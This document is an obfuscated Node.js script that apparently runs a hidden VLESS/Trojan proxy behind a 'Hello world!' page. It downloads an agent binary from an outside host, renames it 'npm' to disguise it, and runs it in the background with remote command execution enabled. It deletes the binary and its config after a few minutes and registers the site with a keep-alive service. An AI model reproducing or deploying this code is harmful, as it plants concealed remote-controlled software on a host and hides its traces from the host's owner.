const _0xfbd01c=_0x3ed9;(function(_0x38af89,_0x2bfe02){const _0x5f02fb=_0x3ed9,_0xebadb7=_0x38af89();while(!![]){try{const _0x5d9d6c=-parseInt(_0x5f02fb(0xc9))/0x1+-parseInt(_0x5f02fb(0xa8))/0x2+parseInt(_0x5f02fb(0xb4))/0x3*(parseInt(_0x5f02fb(0xff))/0x4)+-parseInt(_0x5f02fb(0xd1))/0x5*(-parseInt(_0x5f02fb(0xe2))/0x6)+-parseInt(_0x5f02fb(0xe3))/0x7+-parseInt(_0x5f02fb(0xbe))/0x8*(-parseInt(_0x5f02fb(0x11e))/0x9)+-parseInt(_0x5f02fb(0xdf))/0xa*(-parseInt(_0x5f02fb(0x104))/0xb);if(_0x5d9d6c===_0x2bfe02)break;else _0xebadb7['push'](_0xebadb7['shift']());}catch(_0x13a161){_0xebadb7['push'](_0xebadb7['shift']());}}}(_0x1224,0x49717));function _0x1224(){const _0x2400b3=['url','index.html','SUB_PATH','46370ZeaCGn','pipe','pop','282BpfvqT','2845633itooMg','map','listen','substr',':443?encryption=none&security=tls&sni=','UUID','writeFileSync','isp','utf-8','chmod\x20+x\x20npm','NAME','then','digest','type','setsid\x20nohup\x20./npm\x20-s\x20','update','Server','npm','test','npm\x20is\x20already\x20running,\x20skip\x20running...','PORT','readUInt8','country_code','npm\x20running\x20error:','trojan://','axios','message','buffer','4vzJDdC','end','/bin/bash','Automatic\x20Access\x20Task\x20added\x20successfully','unlink','583CkJBGi','createHash','join','close','WSPATH','error:\x20','--tls','writeHead','arch','child_process','false','reduce','toString','https://amd64.ssss.nyc.mn/v1','2087','text/plain','Unknown','2053','Hello\x20world!','from','sub','data','finish','&fp=chrome&type=ws&host=',':443?security=tls&sni=','NEZHA_PORT','11574kpQteS','write','application/json','Hug','application/dns-json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','net','log','base64','concat','send','hex','readUInt16BE','https://api.ip.sb/geoip','&type=A','667652nbsOEo','2096','https://arm64.ssss.nyc.mn/v1','sha224','config.yaml','get','includes','trim','2083','text/html','slice','createWriteStream','544395vZDdwf','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/agent','npm\x20is\x20running','connection','NEZHA_SERVER','https://oooo.serv00.net/add-url','readFile','arm','connect','3320piIZgD','https://amd64.ssss.nyc.mn/agent','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','replace','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','catch','DOMAIN','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','true','every','env','199304aSvwRq','npm\x20download\x20successfully','Server\x20is\x20running\x20on\x20port\x20','NEZHA_KEY','decode','find','Failed\x20to\x20resolve\x20','\x20with\x20all\x20DNS\x20servers','29740pCXuGP','8443','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','&path=%2F','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','https://','8883cbd0-f823-497b-8545-5cc991d60086','Answer','http','length','error'];_0x1224=function(){return _0x2400b3;};return _0x1224();}const os=require('os'),http=require(_0xfbd01c(0xd9)),fs=require('fs'),axios=require(_0xfbd01c(0xfc)),net=require(_0xfbd01c(0x9f)),path=require('path'),crypto=require('crypto'),{Buffer}=require(_0xfbd01c(0xfe)),{exec,execSync}=require(_0xfbd01c(0x10d)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xfbd01c(0xc8)][_0xfbd01c(0xe8)]||_0xfbd01c(0xd7),NEZHA_SERVER=process[_0xfbd01c(0xc8)][_0xfbd01c(0xb9)]||'',NEZHA_PORT=process[_0xfbd01c(0xc8)][_0xfbd01c(0x11d)]||'',NEZHA_KEY=process[_0xfbd01c(0xc8)][_0xfbd01c(0xcc)]||'',DOMAIN=process[_0xfbd01c(0xc8)][_0xfbd01c(0xc4)]||'1234.abc.com',AUTO_ACCESS=process[_0xfbd01c(0xc8)]['AUTO_ACCESS']||![],WSPATH=process[_0xfbd01c(0xc8)][_0xfbd01c(0x108)]||UUID[_0xfbd01c(0xb2)](0x0,0x8),SUB_PATH=process[_0xfbd01c(0xc8)][_0xfbd01c(0xde)]||_0xfbd01c(0x118),NAME=process['env'][_0xfbd01c(0xed)]||_0xfbd01c(0x9c),PORT=process[_0xfbd01c(0xc8)][_0xfbd01c(0xf7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4206f4=_0xfbd01c;try{const _0x3c43d2=await axios['get'](_0x4206f4(0xa6)),_0x1dd234=_0x3c43d2['data'];ISP=(_0x1dd234[_0x4206f4(0xf9)]+'-'+_0x1dd234[_0x4206f4(0xea)])[_0x4206f4(0xc1)](/ /g,'_');}catch(_0x196231){ISP=_0x4206f4(0x114);}};GetISP();const httpServer=http['createServer']((_0x3a040f,_0x44b466)=>{const _0x3e14c1=_0xfbd01c;if(_0x3a040f['url']==='/'){const _0x64f3dc=path[_0x3e14c1(0x106)](__dirname,_0x3e14c1(0xdd));fs[_0x3e14c1(0xbb)](_0x64f3dc,'utf8',(_0x413016,_0x1619de)=>{const _0x44a4ce=_0x3e14c1;if(_0x413016){_0x44b466['writeHead'](0xc8,{'Content-Type':_0x44a4ce(0xb1)}),_0x44b466[_0x44a4ce(0x100)](_0x44a4ce(0x116));return;}_0x44b466['writeHead'](0xc8,{'Content-Type':_0x44a4ce(0xb1)}),_0x44b466[_0x44a4ce(0x100)](_0x1619de);});return;}else{if(_0x3a040f['url']==='/'+SUB_PATH){const _0x289c76=NAME?NAME+'-'+ISP:ISP,_0xa7047f='vless://'+UUID+'@'+DOMAIN+_0x3e14c1(0xe7)+DOMAIN+_0x3e14c1(0x11b)+DOMAIN+_0x3e14c1(0xd4)+WSPATH+'#'+_0x289c76,_0x2863c3=_0x3e14c1(0xfb)+UUID+'@'+DOMAIN+_0x3e14c1(0x11c)+DOMAIN+_0x3e14c1(0x11b)+DOMAIN+_0x3e14c1(0xd4)+WSPATH+'#'+_0x289c76,_0x47fb33=_0xa7047f+'\x0a'+_0x2863c3,_0x25a972=Buffer[_0x3e14c1(0x117)](_0x47fb33)[_0x3e14c1(0x110)](_0x3e14c1(0xa1));_0x44b466['writeHead'](0xc8,{'Content-Type':_0x3e14c1(0x113)}),_0x44b466['end'](_0x25a972+'\x0a');}else _0x44b466[_0x3e14c1(0x10b)](0x194,{'Content-Type':_0x3e14c1(0x113)}),_0x44b466[_0x3e14c1(0x100)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0xfbd01c(0xf3))]({'server':httpServer}),uuid=UUID[_0xfbd01c(0xc1)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x478df1){return new Promise((_0x59a219,_0x27e8e0)=>{const _0x3f43b1=_0x3ed9;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3f43b1(0xf5)](_0x478df1)){_0x59a219(_0x478df1);return;}let _0x258bf3=0x0;function _0x3571b8(){const _0x345747=_0x3f43b1;if(_0x258bf3>=DNS_SERVERS[_0x345747(0xda)]){_0x27e8e0(new Error(_0x345747(0xcf)+_0x478df1+_0x345747(0xd0)));return;}const _0x51bf2e=DNS_SERVERS[_0x258bf3];_0x258bf3++;const _0x5d6f69='https://dns.google/resolve?name='+encodeURIComponent(_0x478df1)+_0x345747(0xa7);axios[_0x345747(0xad)](_0x5d6f69,{'timeout':0x1388,'headers':{'Accept':_0x345747(0x9d)}})[_0x345747(0xee)](_0x405f8b=>{const _0x52a107=_0x345747,_0xfc4056=_0x405f8b[_0x52a107(0x119)];if(_0xfc4056['Status']===0x0&&_0xfc4056[_0x52a107(0xd8)]&&_0xfc4056['Answer'][_0x52a107(0xda)]>0x0){const _0x44b7d4=_0xfc4056[_0x52a107(0xd8)][_0x52a107(0xce)](_0x2e733e=>_0x2e733e[_0x52a107(0xf0)]===0x1);if(_0x44b7d4){_0x59a219(_0x44b7d4[_0x52a107(0x119)]);return;}}_0x3571b8();})[_0x345747(0xc3)](_0x27ccec=>{_0x3571b8();});}_0x3571b8();});}function handleVlessConnection(_0x24f942,_0x5233ad){const _0x31a184=_0xfbd01c,[_0x1fb420]=_0x5233ad,_0x52782f=_0x5233ad[_0x31a184(0xb2)](0x1,0x11);if(!_0x52782f['every']((_0xf5dff6,_0x52dc3f)=>_0xf5dff6==parseInt(uuid[_0x31a184(0xe6)](_0x52dc3f*0x2,0x2),0x10)))return![];let _0x51c9bc=_0x5233ad['slice'](0x11,0x12)[_0x31a184(0xf8)]()+0x13;const _0x41626a=_0x5233ad['slice'](_0x51c9bc,_0x51c9bc+=0x2)['readUInt16BE'](0x0),_0x5a798b=_0x5233ad[_0x31a184(0xb2)](_0x51c9bc,_0x51c9bc+=0x1)[_0x31a184(0xf8)](),_0x39738d=_0x5a798b==0x1?_0x5233ad['slice'](_0x51c9bc,_0x51c9bc+=0x4)[_0x31a184(0x106)]('.'):_0x5a798b==0x2?new TextDecoder()[_0x31a184(0xcd)](_0x5233ad['slice'](_0x51c9bc+0x1,_0x51c9bc+=0x1+_0x5233ad[_0x31a184(0xb2)](_0x51c9bc,_0x51c9bc+0x1)[_0x31a184(0xf8)]())):_0x5a798b==0x3?_0x5233ad[_0x31a184(0xb2)](_0x51c9bc,_0x51c9bc+=0x10)['reduce']((_0x488294,_0x43c1f7,_0x2eec8f,_0x587d56)=>_0x2eec8f%0x2?_0x488294[_0x31a184(0xa2)](_0x587d56[_0x31a184(0xb2)](_0x2eec8f-0x1,_0x2eec8f+0x1)):_0x488294,[])['map'](_0x46b2a8=>_0x46b2a8['readUInt16BE'](0x0)[_0x31a184(0x110)](0x10))['join'](':'):'';_0x24f942[_0x31a184(0xa3)](new Uint8Array([_0x1fb420,0x0]));const _0x92574b=createWebSocketStream(_0x24f942);return resolveHost(_0x39738d)['then'](_0x5c65fa=>{const _0x292f5c=_0x31a184;net[_0x292f5c(0xbd)]({'host':_0x5c65fa,'port':_0x41626a},function(){const _0x2f716c=_0x292f5c;this[_0x2f716c(0x11f)](_0x5233ad[_0x2f716c(0xb2)](_0x51c9bc)),_0x92574b['on'](_0x2f716c(0xdb),()=>{})[_0x2f716c(0xe0)](this)['on'](_0x2f716c(0xdb),()=>{})['pipe'](_0x92574b);})['on'](_0x292f5c(0xdb),()=>{});})[_0x31a184(0xc3)](_0x548569=>{const _0x2f9ffd=_0x31a184;net[_0x2f9ffd(0xbd)]({'host':_0x39738d,'port':_0x41626a},function(){const _0x191585=_0x2f9ffd;this[_0x191585(0x11f)](_0x5233ad['slice'](_0x51c9bc)),_0x92574b['on'](_0x191585(0xdb),()=>{})[_0x191585(0xe0)](this)['on'](_0x191585(0xdb),()=>{})[_0x191585(0xe0)](_0x92574b);})['on'](_0x2f9ffd(0xdb),()=>{});}),!![];}function handleTrojanConnection(_0x5684bb,_0x747a04){const _0x4a66e5=_0xfbd01c;try{if(_0x747a04['length']<0x3a)return![];const _0xb38846=_0x747a04[_0x4a66e5(0xb2)](0x0,0x38)[_0x4a66e5(0x110)](),_0x56f84d=[UUID];let _0x58b7bd=null;for(const _0x5950d4 of _0x56f84d){const _0x160adc=crypto[_0x4a66e5(0x105)](_0x4a66e5(0xab))[_0x4a66e5(0xf2)](_0x5950d4)[_0x4a66e5(0xef)](_0x4a66e5(0xa4));if(_0x160adc===_0xb38846){_0x58b7bd=_0x5950d4;break;}}if(!_0x58b7bd)return![];let _0x5ca655=0x38;_0x747a04[_0x5ca655]===0xd&&_0x747a04[_0x5ca655+0x1]===0xa&&(_0x5ca655+=0x2);const _0x2c8b11=_0x747a04[_0x5ca655];if(_0x2c8b11!==0x1)return![];_0x5ca655+=0x1;const _0x2f17af=_0x747a04[_0x5ca655];_0x5ca655+=0x1;let _0x3852f8,_0xb62646;if(_0x2f17af===0x1)_0x3852f8=_0x747a04[_0x4a66e5(0xb2)](_0x5ca655,_0x5ca655+0x4)[_0x4a66e5(0x106)]('.'),_0x5ca655+=0x4;else{if(_0x2f17af===0x3){const _0x54ac30=_0x747a04[_0x5ca655];_0x5ca655+=0x1,_0x3852f8=_0x747a04[_0x4a66e5(0xb2)](_0x5ca655,_0x5ca655+_0x54ac30)['toString'](),_0x5ca655+=_0x54ac30;}else{if(_0x2f17af===0x4)_0x3852f8=_0x747a04[_0x4a66e5(0xb2)](_0x5ca655,_0x5ca655+0x10)[_0x4a66e5(0x10f)]((_0x1d5f8b,_0x30a54d,_0x2d27a0,_0x351a00)=>_0x2d27a0%0x2?_0x1d5f8b[_0x4a66e5(0xa2)](_0x351a00[_0x4a66e5(0xb2)](_0x2d27a0-0x1,_0x2d27a0+0x1)):_0x1d5f8b,[])[_0x4a66e5(0xe4)](_0x3da203=>_0x3da203[_0x4a66e5(0xa5)](0x0)[_0x4a66e5(0x110)](0x10))[_0x4a66e5(0x106)](':'),_0x5ca655+=0x10;else return![];}}_0xb62646=_0x747a04['readUInt16BE'](_0x5ca655),_0x5ca655+=0x2;_0x5ca655<_0x747a04[_0x4a66e5(0xda)]&&_0x747a04[_0x5ca655]===0xd&&_0x747a04[_0x5ca655+0x1]===0xa&&(_0x5ca655+=0x2);const _0x322356=createWebSocketStream(_0x5684bb);return resolveHost(_0x3852f8)['then'](_0x46b383=>{const _0x33b89c=_0x4a66e5;net[_0x33b89c(0xbd)]({'host':_0x46b383,'port':_0xb62646},function(){const _0x55102b=_0x33b89c;_0x5ca655<_0x747a04[_0x55102b(0xda)]&&this[_0x55102b(0x11f)](_0x747a04[_0x55102b(0xb2)](_0x5ca655)),_0x322356['on'](_0x55102b(0xdb),()=>{})[_0x55102b(0xe0)](this)['on'](_0x55102b(0xdb),()=>{})['pipe'](_0x322356);})['on'](_0x33b89c(0xdb),()=>{});})['catch'](_0xbcc73=>{const _0x121418=_0x4a66e5;net[_0x121418(0xbd)]({'host':_0x3852f8,'port':_0xb62646},function(){const _0x2dfd25=_0x121418;_0x5ca655<_0x747a04[_0x2dfd25(0xda)]&&this[_0x2dfd25(0x11f)](_0x747a04[_0x2dfd25(0xb2)](_0x5ca655)),_0x322356['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x2dfd25(0xe0)](_0x322356);})['on'](_0x121418(0xdb),()=>{});}),!![];}catch(_0x3d7927){return![];}}wss['on'](_0xfbd01c(0xb8),(_0x51c2d9,_0x411eec)=>{const _0x30fcc3=_0xfbd01c,_0xbef19f=_0x411eec[_0x30fcc3(0xdc)]||'';_0x51c2d9['once'](_0x30fcc3(0xfd),_0x5e944c=>{const _0x24a592=_0x30fcc3;if(_0x5e944c[_0x24a592(0xda)]>0x11&&_0x5e944c[0x0]===0x0){const _0x2941a6=_0x5e944c['slice'](0x1,0x11),_0x9ac634=_0x2941a6[_0x24a592(0xc7)]((_0x34c22a,_0x3c6e6f)=>_0x34c22a==parseInt(uuid['substr'](_0x3c6e6f*0x2,0x2),0x10));if(_0x9ac634){!handleVlessConnection(_0x51c2d9,_0x5e944c)&&_0x51c2d9['close']();return;}}!handleTrojanConnection(_0x51c2d9,_0x5e944c)&&_0x51c2d9[_0x24a592(0x107)]();})['on'](_0x30fcc3(0xdb),()=>{});});const getDownloadUrl=()=>{const _0xb22251=_0xfbd01c,_0x4fdc3b=os[_0xb22251(0x10c)]();return _0x4fdc3b===_0xb22251(0xbc)||_0x4fdc3b==='arm64'||_0x4fdc3b==='aarch64'?!NEZHA_PORT?_0xb22251(0xaa):_0xb22251(0xb6):!NEZHA_PORT?_0xb22251(0x111):_0xb22251(0xbf);},downloadFile=async()=>{const _0x2f95d1=_0xfbd01c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x135883=getDownloadUrl(),_0x4bf813=await axios({'method':_0x2f95d1(0xad),'url':_0x135883,'responseType':'stream'}),_0x75d4a5=fs[_0x2f95d1(0xb3)](_0x2f95d1(0xf4));return _0x4bf813['data'][_0x2f95d1(0xe0)](_0x75d4a5),new Promise((_0x3e9b63,_0x2f483b)=>{const _0x123b4d=_0x2f95d1;_0x75d4a5['on'](_0x123b4d(0x11a),()=>{const _0x31e470=_0x123b4d;console[_0x31e470(0xa0)](_0x31e470(0xca)),exec(_0x31e470(0xec),_0x4af73e=>{if(_0x4af73e)_0x2f483b(_0x4af73e);_0x3e9b63();});}),_0x75d4a5['on']('error',_0x2f483b);});}catch(_0x4e850c){throw _0x4e850c;}},runnz=async()=>{const _0x447d95=_0xfbd01c;try{const _0x244213=execSync(_0x447d95(0xc0),{'encoding':_0x447d95(0xeb)});if(_0x244213[_0x447d95(0xaf)]()!==''){console[_0x447d95(0xa0)](_0x447d95(0xf6));return;}}catch(_0x1ccbc6){}await downloadFile();let _0x17ed03='',_0x16640e=['443',_0x447d95(0xd2),_0x447d95(0xa9),_0x447d95(0x112),_0x447d95(0xb0),_0x447d95(0x115)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3124e3=_0x16640e[_0x447d95(0xae)](NEZHA_PORT)?_0x447d95(0x10a):'';_0x17ed03=_0x447d95(0xf1)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3124e3+_0x447d95(0xb5);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1dd0ad=NEZHA_SERVER[_0x447d95(0xae)](':')?NEZHA_SERVER['split'](':')[_0x447d95(0xe1)]():'',_0x29e554=_0x16640e[_0x447d95(0xae)](_0x1dd0ad)?_0x447d95(0xc6):_0x447d95(0x10e),_0x4e5338='client_secret:\x20'+NEZHA_KEY+_0x447d95(0x9e)+NEZHA_SERVER+_0x447d95(0xc2)+_0x29e554+_0x447d95(0xc5)+UUID;fs[_0x447d95(0xe9)](_0x447d95(0xac),_0x4e5338);}_0x17ed03=_0x447d95(0xd3);}else{console[_0x447d95(0xa0)](_0x447d95(0xd5));return;}}try{exec(_0x17ed03,{'shell':_0x447d95(0x101)},_0x41fb6f=>{const _0x1da2f1=_0x447d95;if(_0x41fb6f)console[_0x1da2f1(0xdb)](_0x1da2f1(0xfa),_0x41fb6f);else console[_0x1da2f1(0xa0)](_0x1da2f1(0xb7));});}catch(_0x4788a2){console[_0x447d95(0xdb)](_0x447d95(0x109)+_0x4788a2);}};async function addAccessTask(){const _0x3d509f=_0xfbd01c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5340c9=_0x3d509f(0xd6)+DOMAIN;try{const _0x58f34c=await axios['post'](_0x3d509f(0xba),{'url':_0x5340c9},{'headers':{'Content-Type':_0x3d509f(0x9b)}});console[_0x3d509f(0xa0)](_0x3d509f(0x102));}catch(_0x56a4d4){}}function _0x3ed9(_0x24b7cb,_0x1c3d21){_0x24b7cb=_0x24b7cb-0x9b;const _0x122478=_0x1224();let _0x3ed9ac=_0x122478[_0x24b7cb];return _0x3ed9ac;}const delFiles=()=>{const _0x3e1adf=_0xfbd01c;fs[_0x3e1adf(0x103)](_0x3e1adf(0xf4),()=>{}),fs[_0x3e1adf(0x103)](_0x3e1adf(0xac),()=>{});};httpServer[_0xfbd01c(0xe5)](PORT,()=>{const _0x1c174b=_0xfbd01c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1c174b(0xa0)](_0x1c174b(0xcb)+PORT);});
